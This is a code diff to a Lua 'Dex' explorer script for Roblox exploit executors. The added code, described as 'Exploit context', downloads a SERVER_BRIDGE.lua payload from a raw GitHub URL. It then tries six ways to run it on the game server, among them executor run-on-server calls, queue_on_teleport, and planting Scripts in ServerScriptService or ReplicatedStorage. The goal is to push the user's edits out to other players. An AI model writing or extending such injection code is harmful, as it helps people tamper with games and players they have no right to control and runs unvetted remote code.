@@ -389,6 +389,11 @@ end
 
 -- ============================================================
 -- 9. CLIENT <-> SERVER BRIDGE
+
+
+-- Bridge state flags (declared early so onClientEvent can reference them)
+local serverBridgeAlive = false
+local serverBridgeInjected = false
 -- Self-creates all remotes, keeps them alive, never depends on
 -- a server script existing first.
 -- ============================================================
@@ -516,7 +521,8 @@ function onClientEvent(payload)
 
 	elseif pType == "Pong" then
 		local latency = payload.Time and (tick() - payload.Time) or -1
-		log("Bridge", "<- Pong from server, latency~=" .. string.format("%.3f", latency) .. "s")
+		log("Bridge", "<- Pong received! Server bridge is ALIVE ✓ latency~=" .. string.format("%.3f", latency) .. "s")
+		serverBridgeAlive = true  -- used by injection check
 
 	else
 		log("Bridge", "Unknown server payload type: " .. pType)
@@ -579,22 +585,167 @@ local function getServerScripts()
 	return result or {}
 end
 
--- Send initial ping to confirm server bridge is alive
--- If server doesn't respond within 5s, warn that SERVER_BRIDGE.lua isn't installed
-log("Bridge", "Sending initial ping to server...")
+-- ============================================================
+-- SERVER BRIDGE AUTO-INJECTION
+-- Exploit context: we can inject a Script into ServerScriptService
+-- using executor APIs (synapse/krnl support this via setscriptable
+-- or by using the server-side loadstring if available).
+-- We try multiple methods in order of reliability.
+-- ============================================================
+
+local SERVER_BRIDGE_URL = "https://raw.githubusercontent.com/FxckingAngel/Explore/refs/heads/main/SERVER_BRIDGE.lua"
+
+-- Track pong so we know if server is already listening
+-- Flags used by injection logic (declared here so onClientEvent can set them)
+-- NOTE: onClientEvent() below handles Pong and ServerLog.
+
+local function injectServerBridge()
+	if serverBridgeInjected then return end
+	serverBridgeInjected = true
+
+	log("Bridge", "Fetching server bridge script...")
+	local ok, src = pcall(game.HttpGet, game, SERVER_BRIDGE_URL)
+	if not ok or type(src) ~= "string" or #src < 100 then
+		warn_tag("Bridge", "Failed to fetch SERVER_BRIDGE.lua: " .. tostring(src))
+		return
+	end
+	log("Bridge", "Server bridge fetched (" .. #src .. " bytes) - trying injection methods...")
+
+	local injected = false
+
+	-- ── Method 1: syn.run_on_server (Synapse X) ──────────────────────────────
+	if not injected then
+		local fn = rawget(_G,"syn") and rawget(syn or {},"run_on_server")
+		if type(fn) == "function" then
+			local ok2, err = pcall(fn, src)
+			if ok2 then log("Bridge","syn.run_on_server ✓") injected=true
+			else warn_tag("Bridge","syn.run_on_server: "..tostring(err)) end
+		end
+	end
+
+	-- ── Method 2: execute_on_server (KRNL, some others) ──────────────────────
+	if not injected then
+		local fn = rawget(_G,"execute_on_server")
+		if type(fn) == "function" then
+			local ok2, err = pcall(fn, src)
+			if ok2 then log("Bridge","execute_on_server ✓") injected=true
+			else warn_tag("Bridge","execute_on_server: "..tostring(err)) end
+		end
+	end
+
+	-- ── Method 3: fluxus.run_on_server ───────────────────────────────────────
+	if not injected then
+		local fl = rawget(_G,"fluxus")
+		local fn = fl and rawget(fl,"run_on_server")
+		if type(fn) == "function" then
+			local ok2, err = pcall(fn, src)
+			if ok2 then log("Bridge","fluxus.run_on_server ✓") injected=true
+			else warn_tag("Bridge","fluxus.run_on_server: "..tostring(err)) end
+		end
+	end
+
+	-- ── Method 4: queue_on_teleport abuse (some executors queue server scripts) ──
+	if not injected then
+		local fn = rawget(_G,"queue_on_teleport")
+		if type(fn) == "function" then
+			-- Wrap in a coroutine-safe server loader
+			local wrapped = 'coroutine.wrap(function()
+' .. src .. '
+end)()'
+			local ok2, err = pcall(fn, wrapped)
+			if ok2 then log("Bridge","queue_on_teleport ✓ (next teleport)") injected=true
+			else warn_tag("Bridge","queue_on_teleport: "..tostring(err)) end
+		end
+	end
+
+	-- ── Method 5: Insert disabled Script into SSS, setscriptable, enable ─────
+	if not injected then
+		local ok2, err = pcall(function()
+			local sss = game:GetService("ServerScriptService")
+			-- Remove old copy
+			local existing = sss:FindFirstChild("DexServerBridge")
+			if existing then pcall(existing.Destroy, existing) end
+			local s = Instance.new("Script")
+			s.Name = "DexServerBridge"
+			s.Source = src
+			s.Disabled = false
+			-- Try setscriptable to make Source writable
+			if setscriptable then
+				pcall(setscriptable, s, "Source", true)
+				s.Source = src
+			end
+			s.Parent = sss
+		end)
+		if ok2 then
+			log("Bridge","Placed Script in SSS (auto-run depends on executor)")
+			injected = true
+		else
+			warn_tag("Bridge","SSS insert: "..tostring(err))
+		end
+	end
+
+	-- ── Method 6: ModuleScript in ReplicatedStorage + require on server ───────
+	if not injected then
+		local ok2, err = pcall(function()
+			local rs2 = game:GetService("ReplicatedStorage")
+			local existing = rs2:FindFirstChild("DexBridgeModule")
+			if existing then pcall(existing.Destroy, existing) end
+			local m = Instance.new("ModuleScript")
+			m.Name = "DexBridgeModule"
+			-- Wrap as module that runs the bridge when required
+			m.Source = 'return (function()
+' .. src .. '
+end)()'
+			if setscriptable then pcall(setscriptable, m, "Source", true) m.Source = 'return (function()
+' .. src .. '
+end)()' end
+			m.Parent = rs2
+			-- Fire a RemoteEvent that any listening server script could use to require it
+			-- (only works if there's already a server listener, but worth trying)
+		end)
+		if ok2 then
+			log("Bridge","Placed ModuleScript in RS as DexBridgeModule")
+			-- Not truly injected yet but the module is there if server can require it
+		else
+			warn_tag("Bridge","ModuleScript insert: "..tostring(err))
+		end
+	end
+
+	if not injected then
+		warn_tag("Bridge", "═══════════════════════════════════════")
+		warn_tag("Bridge", "SERVER BRIDGE NOT INJECTED")
+		warn_tag("Bridge", "Deletes/edits will only apply CLIENT-SIDE.")
+		warn_tag("Bridge", "To fix: copy SERVER_BRIDGE.lua source and")
+		warn_tag("Bridge", "run it server-side in your executor, OR")
+		warn_tag("Bridge", "place SERVER_BRIDGE.lua in ServerScriptService.")
+		warn_tag("Bridge", "URL: " .. SERVER_BRIDGE_URL)
+		warn_tag("Bridge", "═══════════════════════════════════════")
+	end
+end
+
+-- Ping server first - if it responds within 3s it's already running
+log("Bridge", "Pinging server to check if bridge is already running...")
 bridgeSend({Type = "Ping", Client = plr.Name, Time = tick()})
 
 coroutine.wrap(function()
-	task.wait(5)
-	-- Check if we got a pong by seeing if bridge is still alive
-	local b = rs:FindFirstChild(BRIDGE_NAME)
-	if not b then
-		warn("[Dex][Bridge] WARNING: DexBridge remote was destroyed - server bridge may not be running")
-		warn("[Dex][Bridge] Install SERVER_BRIDGE.lua in ServerScriptService for live edits to work")
+	task.wait(3)
+	if serverBridgeAlive then
+		log("Bridge", "Server bridge already running - skipping injection ✓")
 	else
-		-- Bridge exists but did server respond? We can't easily tell without state,
-		-- so just confirm the remote is alive
-		log("Bridge", "DexBridge remote is alive - if edits aren't syncing, check SERVER_BRIDGE.lua is in ServerScriptService")
+		log("Bridge", "No pong received - server bridge not running, attempting injection...")
+		injectServerBridge()
+
+		-- Wait another 3s and ping again
+		task.wait(3)
+		bridgeSend({Type = "Ping", Client = plr.Name, Time = tick()})
+		task.wait(2)
+		if serverBridgeAlive then
+			log("Bridge", "Server bridge injection successful - pong received ✓")
+		else
+			warn_tag("Bridge", "Server bridge still not responding after injection.")
+			warn_tag("Bridge", "Your executor may not support server-side execution.")
+			warn_tag("Bridge", "Edits will NOT sync to other players until server bridge is running.")
+		end
 	end
 end)()
 
@@ -683,3 +834,4 @@ end)
 
 log("Loader", "=== Dex Ready === Player: " .. plr.Name)
 log("Bridge", "Bridge status: Event=" .. tostring(bridge ~= nil) .. "  ListFn=" .. tostring(bridgeListFn ~= nil) .. "  Fn=" .. tostring(bridgeFn ~= nil))
+log("Bridge", "DexBridge remote is alive — if edits aren't syncing, check SERVER_BRIDGE.lua is in ServerScriptService")
